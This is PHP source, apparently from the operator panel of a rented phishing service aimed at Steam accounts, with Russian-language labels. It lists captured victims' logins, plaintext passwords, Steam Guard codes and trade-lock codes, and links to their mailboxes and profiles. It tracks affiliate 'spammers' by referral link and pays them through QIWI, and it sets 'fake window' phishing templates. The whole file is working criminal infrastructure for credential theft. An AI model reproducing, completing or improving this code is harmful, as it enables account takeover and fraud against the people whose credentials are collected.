<?php
require_once("classPanel.php");

	class PageGenerator {
		private $PathToTemplate;
		private $part;
		private $id;
		
		function __construct($PathToTemplate, $part = false, $id = ""){
			$this->PathToTemplate = $PathToTemplate;
			$this->part = $part;
			$this->id = $id;
		}
		
		private function _generatePage($content) {
			$layout = file_get_contents($this->PathToTemplate . "/layout.html");
			$Panel = new classPanel();
			
			$page = str_replace
			(
				array(
					"%content%",
					"%csrf_token%"
				),
				array(
					$content,
					$_SESSION["csrf_token"]
				),
				$layout
			);
			
			if ($Panel->int_GetTimerActivity() > 0) {
				$time_left = $Panel->int_GetTimerTime() - time();
				$days_left = ceil($time_left / 86400); 
				
				$page = str_replace("%timer%", "Дней до конца аренды: " . $days_left, $page);
			}
			else $page = str_replace("%timer%", "", $page);
			
			if ($this->part) {
				$html = str_get_html($page);
				$page = $html->find("#" . $this->id, 0)->innertext;
			}
			
			return $page;
		}
		
		public function GenerateIndex(){
			$content = file_get_contents($this->PathToTemplate . "/pages/main.html");
			
			$Panel = new classPanel();
			
			if (true) { // $Panel->b_AccountsExist()
				/*
				 *     TABLE
				 */
				
				$table_tpl = 
				'
							<table cellpadding="0" cellspacing="0">
                                <thead>
                                    <tr role="row">
										<th style="text-align: center">#</th>
										<th style="text-align: center">Логин</th>
										<th style="text-align: center">Пароль</th>
										<th style="text-align: center">Steam Guard</th>
										<th style="text-align: center">Профиль</th>
										<th style="text-align: center">KT</th>
										<th style="text-align: center">Время</th>
										<th style="text-align: center">Спамер</th>
										<th style="text-align: center">Действия</th>
									</tr>
                                </thead>
                                <tbody>
									%table_content%
								</tbody>
                            </table>
				';
				
				$row_tpl = 
				'
								<tr id="row-%id%" role="row" class="odd %valid-class%" >
								<td style="text-align: center" class="id" > 
										<span class="label label-success">%id%</span>
									</td>
									<td style="text-align: center" class="log" > 
									%login%
										<a href="javascript:LoginCopy(\'#row-%id% .log\')"><i title="Восстановить аккаунт" class="mdi mdi-lock-outline"></i></a></span>
										<a href="https://www.mfsa.info/mail/%login%" target="_blank"><i title="Открыть почту в новой вкладке" class="mdi mdi-gmail"></i></a></span>
									</td>
									<td  style="text-align: center" class="pass" >
										<span title="%password%"><a href="javascript:setPassword(%id%)"><i class="mdi mdi-pencil"></i></a> %password%</span>
									</td>
									<td style="text-align: center" class="guard" > 
										<m4><span class="label label-danger">%guard%</span></m4>
									</td>
									<td style="text-align: center" ><a href="http://steamcommunity.com/profiles/%steamid%" target="_blank"><i class="mdi mdi-steam" title="Открыть профиль в новой вкладке" ></i></a></td>
									<td style="text-align: center">
										<a href="javascript:setKT(%id%)"><i title="Установить код для блокировки" class="mdi mdi-pencil"></i></a>
										%kt%
										<a href="javascript:AntiRed(\'#row-%id% .log\', \'%kt%\')"><i title="Снять КТ" class="mdi mdi-lock-open-outline"></i></a>
									</td>
									<td style="text-align: center">%time%</td>
									<td style="text-align: center">%spamer%</td>
									<td style="text-align: center">
										
										
										
											%valid%
											<a href="javascript:performAction(\'Delete\', {id: %id%}, \'data-table\'); updatePart(\'data-table\'); updatePart(\'stats\')"><span class="label label-danger"><i class="mdi mdi-close" title="Удалить аккаунт" ></i></a></span>&nbsp;
										
											<a href="javascript:showGames(%id%);"><span class="label label-warning"><i class="mdi mdi-gamepad" title="Показать игры на аккаунте"></i></a></span>
										
										
										<span class="games" style="display: none;" >%games%</span>
									</td>
								</tr>
				';
				
				
				$rows = "";
				$accounts = $Panel->arr_GetAccounts();
				$passPrefix = $Panel->s_GetPassPrefix();
				
				for ($i = 0; $i < count($accounts); $i++) {
					if ($accounts[$i]["status"] == 0) {
						$valid_class = "";
						$valid = '
							<a href="javascript:performAction(\'ToggleValid\', {id: %id%}); updatePart(\'data-table\'); updatePart(\'stats\')" title="Пометить как валид" >
								<i class="mdi mdi-check"></i></a>
						';
					}
					else {
						$valid_class = "valid";
						$valid = '
							<a href="javascript:performAction(\'ToggleValid\', {id: %id%}); updatePart(\'data-table\'); updatePart(\'stats\')" title="Пометить как невалид" >
								<i class="mdi mdi-close"></i></a>
						';
					}
					
					$rows .= str_replace
					(
						array("%login%", "%password%", "%guard%", "%steamid%", "%kt%", "%time%", "%spamer%", "%games%", "%valid%", "%valid-class%", "%id%"),
						array(
							
							$accounts[$i]["login"], 
							$accounts[$i]["password"] . $passPrefix, 
							$accounts[$i]["guard"], 
							$accounts[$i]["steamid"], 
							$accounts[$i]["kt"], 
							date("H:i", $accounts[$i]["time"]),
							$accounts[$i]["spammer"],
							$accounts[$i]["games"],
							$valid,
							$valid_class,
							$accounts[$i]["id"]
							
						),
						$row_tpl
					);
				}
				
				$table = str_replace("%table_content%", $rows, $table_tpl);
				/*
				 *     /TABLE
				 */
				 
				$content = str_replace
				(
					array("%table%", "%visits%", "%total_logs%", "%total_sum%", "%balance%", "%requests%"),
					array($table, $Panel->int_GetVisits(), count($accounts), $Panel->int_getTotalSum(), $Panel->s_GetQiwiBalance(), $Panel->int_CountRequests()),
					$content
				);
			}
			// else {
				// $content = str_replace
				// (
					// array("%table%", "%visits%", "%total_logs%", "%total_sum%", "%balance%"),
					// array('<p class="text-center">Нет аккаунтов в базе</p>', $Panel->int_GetVisits(), 0, $Panel->int_getTotalSum(), $Panel->s_GetQiwiBalance()),
					// $content
				// );
			// }
			
			$Page = self::_generatePage($content);
			return $Page;
		}
		
		public function GenerateSpammers(){
			$content = file_get_contents($this->PathToTemplate . "/pages/spammers.html");
			
			$Panel = new classPanel();
			
			if (true) { //$Panel->b_SpammersExist()
				/*
				 *     TABLE
				 */
				
				$table_tpl = 
				'
							<table cellpadding="0" cellspacing="0">
                                <thead>
                                    <tr role="row">
										<th style="text-align: center">#</th>
										<th style="text-align: center">Логин</th>
										<th style="text-align: center">Реф-ссылка</th>
										<th style="text-align: center">QIWI</th>
										<th style="text-align: center">Баланс</th>
										<th style="text-align: center">Действия</th>
									</tr>
                                </thead>
                                <tbody>
									%table_content%
								</tbody>
                            </table>
				';
				
				$row_tpl = 
				'
								<tr id="row-%id%" role="row" class="odd" >
								<td style="text-align: center" class="id" > 
										%id%
									</td>
									<td style="text-align: center" class="log" > 
										<span>%login%</span>
									</td>
									<td style="text-align: center" class="ref-link" >
										<span>%ref-link%</span>
									</td>
									<td style="text-align: center" class="qiwi" >%qiwi%</td>
									<td style="text-align: center" class="balance" >%balance%</td>
									<td style="text-align: center">
										<a href="javascript:setBalance(%id%)"><span class="label label-info"><i class="mdi mdi-pencil" title="Установить баланс"></i></a></span>
										<a href="javascript:performAction(\'DelSpamer\', {id: %id%}); updatePart(\'data-table\');"><span class="label label-danger"><i class="mdi mdi-close" title="Удалить спамера"></i></a></span>
									</td>
								</tr>
				';
				
				$rows = "";
				$spammers = $Panel->arr_GetSpammers();
				
				for ($i = 0; $i < count($spammers); $i++) {
					$rows .= str_replace
					(
						array("%login%", "%ref-link%", "%qiwi%", "%balance%", "%id%"),
						array(
							$spammers[$i]["login"], 
							$_SERVER["SERVER_NAME"] . "/?ref=" . $spammers[$i]["login"],
							$spammers[$i]["qiwi"],
							$spammers[$i]["balance"],
							$spammers[$i]["id"]
						),
						$row_tpl
					);
				}
				
				$table = str_replace("%table_content%", $rows, $table_tpl);
				/*
				 *     /TABLE
				 */
				 
				$content = str_replace
				(
					array("%table%", "%total_sum%", "%requests%"),
					array($table, $Panel->int_getTotalSum(), $Panel->int_CountRequests()),
					$content
				);
			}
			// else {
				// $content = str_replace
				// (
					// array("%table%", "%total_sum%", "%requests%"),
					// array('<p class="text-center">Нет спамеров в базе</p>', $Panel->int_getTotalSum(), $Panel->int_CountRequests()),
					// $content
				// );
			// }
			
			$Page = self::_generatePage($content);
			return $Page;
		}
		
		public function GeneratePayouts() {
			$content = file_get_contents($this->PathToTemplate . "/pages/payments.html");
			
			$Panel = new classPanel();
			
			if (true) { //$Panel->b_RequestsExist()
				/*
				 *     TABLE
				 */
				
				$table_tpl = 
				'
							<table cellpadding="0" cellspacing="0">
                                <thead>
                                    <tr role="row">
										<th style="text-align: center">#</th>
										<th style="text-align: center">Имя</th>
										<th style="text-align: center">Сумма</th>
										<th style="text-align: center">QIWI</th>
										<th style="text-align: center">Комментарий</th>
										<th style="text-align: center">Действия</th>
									</tr>
                                </thead>
                                <tbody>
									%table_content%
								</tbody>
                            </table>
				';
				
				$row_tpl = 
				'
								<tr id="row-%id%" role="row" class="odd" >
								<td style="text-align: center" class="id" > 
										%id%
									</td>
									<td style="text-align: center" class="log" > 
										<span>%login%</span>
									</td>
									<td style="text-align: center" class="sum" >
										<span>%sum%</span>
									</td>
									<td style="text-align: center" class="qiwi" >%qiwi%</td>
									<td style="text-align: center" class="comment" ><input type="text" class="text-field-narrow" value="%comment%" /></td>
									<td style="text-align: center">
										<a href="%link%"><span class="label label-info"><i class="mdi mdi-check" title="Выплатить"></i></a></span>
										<a href="javascript:performAction(\'DenyPayout\', {id: \'%id%\'}); updatePart(\'data-table\');"><span class="label label-danger"><i class="mdi mdi-close" title="Отказать в выплате"></i></a></span>
									</td>
								</tr>
				';
				
				$rows = "";
				$requests = $Panel->arr_GetRequests();
				$default_comment = $Panel->s_GetDefaultComment();
				
				for ($i = 0; $i < count($requests); $i++) {
					$spammer = $Panel->arr_GetSpammerByLogin($requests[$i]["login"]);
					
					$link = "";
					if (QIWI_TOKEN == "") $link = "javascript:openLink(" . $requests[$i]["id"] . ", 'https://qiwi.com/payment/form/99?extra[\'account\']=".$spammer['qiwi']."&amountInteger=".$requests[$i]["sum"]."&currency=643&extra[\'comment\']=')";
					else $link = "javascript:payOut(" . $requests[$i]["id"] . ");";
					
					$rows .= str_replace
					(
						array("%login%", "%sum%", "%qiwi%", "%comment%", "%id%", "%link%"),
						array(
							$requests[$i]["login"], 
							$requests[$i]["sum"],
							$spammer["qiwi"],
							$default_comment,
							$requests[$i]["id"],
							$link
						),
						$row_tpl
					);
				}
				
				$table = str_replace("%table_content%", $rows, $table_tpl);
				/*
				 *     /TABLE
				 */
				 
				$content = str_replace
				(
					array("%table%"),
					array($table),
					$content
				);
			}
			// else {
				// $content = str_replace
				// (
					// array("%table%"),
					// array('<p class="text-center">Нет выплат в базе</p>'),
					// $content
				// );
			// }
			
			$Page = self::_generatePage($content);
			return $Page;
		}
		
		public function GenerateSettings(){
			$content = file_get_contents($this->PathToTemplate . "/pages/settings.html");
			$Panel = new classPanel();
			
			$settings = $Panel->arr_GetSettings();
			$settings_content = "";
			
			foreach ($settings as $key => $setting) {
				if ($setting["name"] == "visits") continue;
				if ($setting["name"] == "timer_activity") continue;
				if ($setting["name"] == "timer_date") continue;
				
				else if ($setting["name"] == "validate_activity") {
					$actavated = $disactavated = "";
					if ($setting["value"] == 1) $actavated = "selected";
					else if ($setting["value"] == 0) $disactavated = "selected";
					
					$settings_content .= '
					<div class="form-group">
						<label for="'. (htmlspecialchars($setting["name"], ENT_QUOTES)) .'">'. (htmlspecialchars($setting["normalName"], ENT_QUOTES)) .'</label>
						<select class="text-field-narrow" name="'. (htmlspecialchars($setting["name"], ENT_QUOTES)) .'" id="'. (htmlspecialchars($setting["name"], ENT_QUOTES)) .'" >
							<option value="1" ' . $actavated . ' >Да</option>
							<option value="0" ' . $disactavated . ' >Нет</option>
						</select>
					</div>
					';
				}
				else if ($setting["name"] == "proxy_activity") {
					$actavated = $disactavated = "";
					if ($setting["value"] == 1) $actavated = "selected";
					else if ($setting["value"] == 0) $disactavated = "selected";
					
					$settings_content .= '
					<div class="form-group">
						<label for="'. (htmlspecialchars($setting["name"], ENT_QUOTES)) .'">'. (htmlspecialchars($setting["normalName"], ENT_QUOTES)) .'</label>
						<select class="text-field-narrow" name="'. (htmlspecialchars($setting["name"], ENT_QUOTES)) .'" id="'. (htmlspecialchars($setting["name"], ENT_QUOTES)) .'" >
							<option value="1" ' . $actavated . ' >Да</option>
							<option value="0" ' . $disactavated . ' >Нет</option>
						</select>
					</div>
					';
				}
				else if ($setting["name"] == "proxy") {
					$settings_content .= '
					<div class="form-group">
						<label for="'. (htmlspecialchars($setting["name"], ENT_QUOTES)) .'">'. (htmlspecialchars($setting["normalName"], ENT_QUOTES)) .'</label>
						<textarea style="height: 150px; resize: none;" name="'. (htmlspecialchars($setting["name"], ENT_QUOTES)) .'" class="text-field-narrow" placeholder="'. (htmlspecialchars($setting["normalName"], ENT_QUOTES)) .'" >' . (htmlspecialchars($setting["value"], ENT_QUOTES)) . '</textarea>
					</div>
					';
				}
				else if ($setting["name"] == "wnd_type") {
					$fake_window = $browser_window = $new_tab = "";
					if ($setting["value"] == 1) $fake_window = "selected";
					else if ($setting["value"] == 2) $browser_window = "selected";
					else if ($setting["value"] == 3) $new_tab = "selected";
					
					$settings_content .= '
					<div class="form-group">
						<label for="'. (htmlspecialchars($setting["name"], ENT_QUOTES)) .'">'. (htmlspecialchars($setting["normalName"], ENT_QUOTES)) .'</label>
						<select class="text-field-narrow" name="'. (htmlspecialchars($setting["name"], ENT_QUOTES)) .'" id="'. (htmlspecialchars($setting["name"], ENT_QUOTES)) .'" >
							<option value="1" ' . $fake_window . ' >Фейковое окно</option>
							<option value="2" ' . $browser_window . ' >Окно браузера</option>
							<option value="3" ' . $new_tab . ' >Новая вкладка</option>
						</select>
					</div>
					';
				}
				else if ($setting["name"] == "sending_activity") {
					$actavated = $disactavated = "";
					if ($setting["value"] == 1) $actavated = "selected";
					else if ($setting["value"] == 0) $disactavated = "selected";
					
					$settings_content .= '
					<div class="form-group">
						<label for="'. (htmlspecialchars($setting["name"], ENT_QUOTES)) .'">'. (htmlspecialchars($setting["normalName"], ENT_QUOTES)) .'</label>
						<select class="text-field-narrow" name="'. (htmlspecialchars($setting["name"], ENT_QUOTES)) .'" id="'. (htmlspecialchars($setting["name"], ENT_QUOTES)) .'" >
							<option value="1" ' . $actavated . ' >Включена</option>
							<option value="0" ' . $disactavated . ' >Выключена</option>
						</select>
					</div>
					';
				}

				else if ($setting["name"] == "fake_template") {
					$TemplateSelecting = '
							<div class="templateSelectWrapper" >
								<div class="action-btn" onclick="$(\'#template-dropdown\').fadeToggle();" >Выбрать шаблон</div>
								
								<div class="dropdownActions" id="template-dropdown" >
									<div>
										%labels%
									</div>
									<span class="action-btn" onclick="$(\'#template-dropdown\').fadeOut();" >Закрыть</span>
								</div>
							</div>
					';
					
					$templates = $Panel->arr_getTemplates();
					$TemplatesCount = count($templates);
					
					for ($i = 1; $i <= $TemplatesCount; $i += 2) {
						if ($i != $TemplatesCount) {
							$TemplateLabels .= '
											<label class="template-label">
												<img width="200" src="/apanel/assets/previews/template-' . $i . '.png" />
												<input type="radio" name="'. (htmlspecialchars($setting["name"], ENT_QUOTES)) .'" id="' . $i . '" value="' . $i . '">
											</label>
											<label class="template-label">
												<img width="200" src="/apanel/assets/previews/template-' . ($i + 1) . '.png" />
												<input type="radio" name="'. (htmlspecialchars($setting["name"], ENT_QUOTES)) .'" id="' . ($i + 1) . '" value="' . ($i + 1) . '">
											</label>
											
											<br />
							';
						}
						else {
							$TemplateLabels .= '
											<label class="template-label">
												<img width="200" src="/apanel/assets/previews/template-' . $i . '.png" />
												<input type="radio" name="'. (htmlspecialchars($setting["name"], ENT_QUOTES)) .'" id="' . $i . '" value="' . $i . '">
											</label>
											
											<br />
							';
						}
					}
					
					$settings_content .= str_replace("%labels%", $TemplateLabels, $TemplateSelecting);
				}
				else {
					$settings_content .= '
					<div class="form-group">
						<label for="'. (htmlspecialchars($setting["name"], ENT_QUOTES)) .'">'. (htmlspecialchars($setting["normalName"], ENT_QUOTES)) .'</label>
						<input type="text" name="'. (htmlspecialchars($setting["name"], ENT_QUOTES)) .'" id="'. (htmlspecialchars($setting["name"], ENT_QUOTES)) .'" class="text-field-narrow" placeholder="'. (htmlspecialchars($setting["normalName"], ENT_QUOTES)) .'" value="'. (htmlspecialchars($setting["value"], ENT_QUOTES)) .'">
					</div>
					';
				}
			}
			
			$content = str_replace("%settings_content%", $settings_content, $content);
			
			$Page = self::_generatePage($content);
			return $Page;
		}
		
		public function GenerateAuth(){
			$Page = file_get_contents($this->PathToTemplate . "/pages/auth.html");
			
			return $Page;
		}
		
		public function GenerateRentIsOver(){
			$Page = file_get_contents($this->PathToTemplate . "/rent_is_over.html");
			
			return $Page;
		}
	}
?>